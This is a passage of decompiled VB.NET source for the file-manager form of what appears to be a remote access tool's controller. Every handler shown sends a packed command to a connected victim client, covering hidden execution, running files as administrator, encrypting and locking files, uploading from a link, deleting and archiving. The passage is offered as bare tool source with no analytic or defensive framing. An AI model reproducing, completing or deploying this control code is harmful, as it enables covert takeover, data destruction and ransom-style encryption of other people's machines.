							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "execute"
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000345 RID: 837 RVA: 0x0001B070 File Offset: 0x00019270
		Private Sub CHiden_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "Hiddenexecute"
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000346 RID: 838 RVA: 0x0001B170 File Offset: 0x00019370
		Private Sub CRunAdmin_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "RunasAdministartor"
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000347 RID: 839 RVA: 0x0001B270 File Offset: 0x00019470
		Private Sub CHide_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "HiddenAndShow"
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000348 RID: 840 RVA: 0x0001B394 File Offset: 0x00019594
		Private Sub CShow_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "HiddenAndShow"
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000349 RID: 841 RVA: 0x0001B4B8 File Offset: 0x000196B8
		Private Sub CEncrypt_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim flag2 As Boolean = listViewItem.ImageIndex <> 0 AndAlso listViewItem.ImageIndex <> 1 AndAlso listViewItem.ImageIndex <> 2
							If flag2 Then
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileManager"
								msgPack.ForcePathObject("Command").AsString = "encryptFile"
								msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
								msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							End If
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600034A RID: 842 RVA: 0x0001B624 File Offset: 0x00019824
		Private Sub CDecrypt_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim flag2 As Boolean = listViewItem.ImageIndex <> 0 AndAlso listViewItem.ImageIndex <> 1 AndAlso listViewItem.ImageIndex <> 2
							If flag2 Then
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileManager"
								msgPack.ForcePathObject("Command").AsString = "dcryptFile"
								msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
								msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							End If
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600034B RID: 843 RVA: 0x0001B790 File Offset: 0x00019990
		Private Sub CLock_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "Lock"
							msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600034C RID: 844 RVA: 0x0001B8B4 File Offset: 0x00019AB4
		Private Sub CUnlock_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "Unlock"
							msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600034D RID: 845 RVA: 0x0001B9D8 File Offset: 0x00019BD8
		Private Sub CUploadFromLink_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, "", False) <> 0
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					Dim dwid As String = Guid.NewGuid().ToString()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "UploadFromLink"
					msgPack.ForcePathObject("Folder").AsString = Me.TextBox1.Text + "\"
					msgPack.ForcePathObject("DWID").AsString = dwid
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					MyBase.BeginInvoke(New MethodInvoker(Sub()
						Dim uploadFromLink As UploadFromLink = CType(Application.OpenForms("UploadFromLink:" + dwid), UploadFromLink)
						Dim flag2 As Boolean = uploadFromLink Is Nothing
						If flag2 Then
							uploadFromLink = New UploadFromLink() With { .Name = "UploadFromLink:" + dwid, .Text = "UploadFromLink", .Info = Me.ClientInfo.Text, .Client = Me.Client }
							uploadFromLink.Show()
						End If
					End Sub))
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600034E RID: 846 RVA: 0x0001BAF0 File Offset: 0x00019CF0
		Private Sub CRename_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count = 1
			If flag Then
				Try
					Dim text As String = Interaction.InputBox("Rename File or Folder", "Name", Me.L2.SelectedItems(0).Text, -1, -1)
					Dim flag2 As Boolean = String.IsNullOrEmpty(text)
					If Not flag2 Then
						Dim flag3 As Boolean = Me.L2.SelectedItems(0).ImageIndex <> 0 AndAlso Me.L2.SelectedItems(0).ImageIndex <> 1 AndAlso Me.L2.SelectedItems(0).ImageIndex <> 2
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "renameFile"
							msgPack.ForcePathObject("File").AsString = Me.L2.SelectedItems(0).ToolTipText
							msgPack.ForcePathObject("NewName").AsString = Path.Combine(Me.TextBox1.Text, text)
							msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Else
							Dim flag4 As Boolean = Me.L2.SelectedItems(0).ImageIndex = 0
							If flag4 Then
								Dim msgPack2 As MsgPack = New MsgPack()
								msgPack2.ForcePathObject("Packet").AsString = "fileManager"
								msgPack2.ForcePathObject("Command").AsString = "renameFolder"
								msgPack2.ForcePathObject("Folder").AsString = Me.L2.SelectedItems(0).ToolTipText + "\"
								msgPack2.ForcePathObject("NewName").AsString = Path.Combine(Me.TextBox1.Text, text)
								msgPack2.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
							End If
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x0600034F RID: 847 RVA: 0x0001BD80 File Offset: 0x00019F80
		Private Sub CEditor_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						Dim enumerator As IEnumerator = Me.L2.SelectedItems.GetEnumerator()
						While enumerator.MoveNext()
							Dim CS$<>8__locals1 As FormFileManager._Closure$__293-1 = New FormFileManager._Closure$__293-1(CS$<>8__locals1)
							CS$<>8__locals1.$VB$Me = Me
							CS$<>8__locals1.$VB$Local_itm = CType(enumerator.Current, ListViewItem)
							Dim flag2 As Boolean = CS$<>8__locals1.$VB$Local_itm.ImageIndex <> 0 AndAlso CS$<>8__locals1.$VB$Local_itm.ImageIndex <> 1 AndAlso CS$<>8__locals1.$VB$Local_itm.ImageIndex <> 2
							If flag2 Then
								Dim CS$<>8__locals2 As FormFileManager._Closure$__293-0 = New FormFileManager._Closure$__293-0(CS$<>8__locals2)
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1
								CS$<>8__locals2.$VB$Local_dwid = Guid.NewGuid().ToString()
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileManager"
								msgPack.ForcePathObject("Command").AsString = "Editor"
								msgPack.ForcePathObject("File").AsString = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.ToolTipText
								msgPack.ForcePathObject("DWID").AsString = CS$<>8__locals2.$VB$Local_dwid
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
								MyBase.BeginInvoke(New MethodInvoker(Sub()
									Dim formNote As FormNote = CType(Application.OpenForms("Editor:" + CS$<>8__locals2.$VB$Local_dwid), FormNote)
									Dim flag3 As Boolean = formNote Is Nothing
									If flag3 Then
										formNote = New FormNote() With { .Name = "Editor:" + CS$<>8__locals2.$VB$Local_dwid, .Text = "Editor", .Info = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.ClientInfo.Text, .PathsFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.ToolTipText, .SizeFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.SubItems(3).Text, .TypeFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.SubItems(2).Text, .DateFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.SubItems(1).Text, .Client = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.Client }
										formNote.Show()
									End If
								End Sub))
							End If
						End While
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000350 RID: 848 RVA: 0x0001BF54 File Offset: 0x0001A154
		Private Sub CCopy_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Dim stringBuilder As StringBuilder = New StringBuilder()
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							stringBuilder.Append(listViewItem.ToolTipText + "-=>")
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "copyFile"
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString()
					msgPack.ForcePathObject("IO").AsString = "copy"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000351 RID: 849 RVA: 0x0001C08C File Offset: 0x0001A28C
		Private Sub CCut_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Dim stringBuilder As StringBuilder = New StringBuilder()
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							stringBuilder.Append(listViewItem.ToolTipText + "-=>")
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "copyFile"
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString()
					msgPack.ForcePathObject("IO").AsString = "cut"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000352 RID: 850 RVA: 0x0001C1C4 File Offset: 0x0001A3C4
		Private Sub CPast_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "fileManager"
				msgPack.ForcePathObject("Command").AsString = "pasteFile"
				msgPack.ForcePathObject("File").AsString = Me.TextBox1.Text
				msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000353 RID: 851 RVA: 0x0001C27C File Offset: 0x0001A47C
		Private Sub CNewFolder_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Name", "Create Folder", "New folder", -1, -1)
				Dim flag As Boolean = String.IsNullOrEmpty(text)
				If Not flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "createFolder"
					msgPack.ForcePathObject("Folder").AsString = Path.Combine(Me.TextBox1.Text, text)
					msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000354 RID: 852 RVA: 0x0001C360 File Offset: 0x0001A560
		Private Sub CNewEmptyFile_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Name", "Create File", "New Text Document.txt", -1, -1)
				Dim flag As Boolean = String.IsNullOrEmpty(text)
				If Not flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "createFile"
					msgPack.ForcePathObject("File").AsString = Path.Combine(Me.TextBox1.Text, text)
					msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000355 RID: 853 RVA: 0x0001C444 File Offset: 0x0001A644
		Private Sub CShortCut_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Target", "Create ShortCut", "C:\Windows\System32\cmd.exe", -1, -1)
				Dim flag As Boolean = String.IsNullOrEmpty(text)
				If Not flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "createShortCut"
					msgPack.ForcePathObject("File").AsString = Path.Combine(Me.TextBox1.Text, "New ShortCut")
					msgPack.ForcePathObject("Target").AsString = text
					msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000356 RID: 854 RVA: 0x0001C540 File Offset: 0x0001A740
		Private Sub CDelete_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim flag2 As Boolean = listViewItem.ImageIndex <> 0 AndAlso listViewItem.ImageIndex <> 1 AndAlso listViewItem.ImageIndex <> 2
							If flag2 Then
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileManager"
								msgPack.ForcePathObject("Command").AsString = "deleteFile"
								msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
								msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							Else
								Dim flag3 As Boolean = listViewItem.ImageIndex = 0
								If flag3 Then
									Dim msgPack2 As MsgPack = New MsgPack()
									msgPack2.ForcePathObject("Packet").AsString = "fileManager"
									msgPack2.ForcePathObject("Command").AsString = "deleteFolder"
									msgPack2.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
									msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText
									ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
								End If
							End If
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000357 RID: 855 RVA: 0x0001C748 File Offset: 0x0001A948
		Private Sub CAddArchive_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Dim text As String = Interaction.InputBox("Name", "Add Archive", Path.GetFileName(Me.TextBox1.Text) + ".rar", -1, -1)
					Dim flag2 As Boolean = String.IsNullOrEmpty(text)
					If Not flag2 Then
						Try
							For Each obj As Object In Me.L2.SelectedItems
								Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
								Dim flag3 As Boolean = listViewItem.ImageIndex <> 0 AndAlso listViewItem.ImageIndex <> 1 AndAlso listViewItem.ImageIndex <> 2
								If flag3 Then
									Dim msgPack As MsgPack = New MsgPack()
									msgPack.ForcePathObject("Packet").AsString = "fileManager"
									msgPack.ForcePathObject("Command").AsString = "AddArchive"
									msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
									msgPack.ForcePathObject("Path").AsString = Me.TextBox1.Text + "\"
									msgPack.ForcePathObject("NamaRAR").AsString = text
									msgPack.ForcePathObject("FileNama").AsString = Me.L2.SelectedItems(0).Text
									ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
								Else
									Dim flag4 As Boolean = listViewItem.ImageIndex = 0
									If flag4 Then
										Dim msgPack2 As MsgPack = New MsgPack()
										msgPack2.ForcePathObject("Packet").AsString = "fileManager"
										msgPack2.ForcePathObject("Command").AsString = "AddArchive"
										msgPack2.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
										msgPack2.ForcePathObject("Path").AsString = Me.TextBox1.Text + "\"
										msgPack2.ForcePathObject("NamaRAR").AsString = text
										msgPack2.ForcePathObject("FileNama").AsString = Me.L2.SelectedItems(0).Text
										ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
									End If
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000358 RID: 856 RVA: 0x0001CA28 File Offset: 0x0001AC28
		Private Sub CExtractHere_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "ExtractArchive"
							msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							msgPack.ForcePathObject("NamaRAR").AsString = Path.GetFileName(listViewItem.ToolTipText)
							msgPack.ForcePathObject("Save").AsString = "UnRAR_" + Path.GetFileName(Me.TextBox1.Text) + "\"
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000359 RID: 857 RVA: 0x0001CBB0 File Offset: 0x0001ADB0
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x04000180 RID: 384
		Private FormSize As Boolean

		' Token: 0x04000181 RID: 385
		Public IsConnected As Boolean

		' Token: 0x04000182 RID: 386
		Private $STATIC$SearchTextInListView$2031E1281E98$unList As ListView

		' Token: 0x04000183 RID: 387
		Private $STATIC$SearchTextInListView$2031E1281E98$unList$Init As StaticLocalInitFlag

		' Token: 0x04000184 RID: 388
		Private $STATIC$SearchTextInListView$2031E1281E98$lastRearch As String

		' Token: 0x04000185 RID: 389
		Private $STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init As StaticLocalInitFlag
	End Class
End Namespace
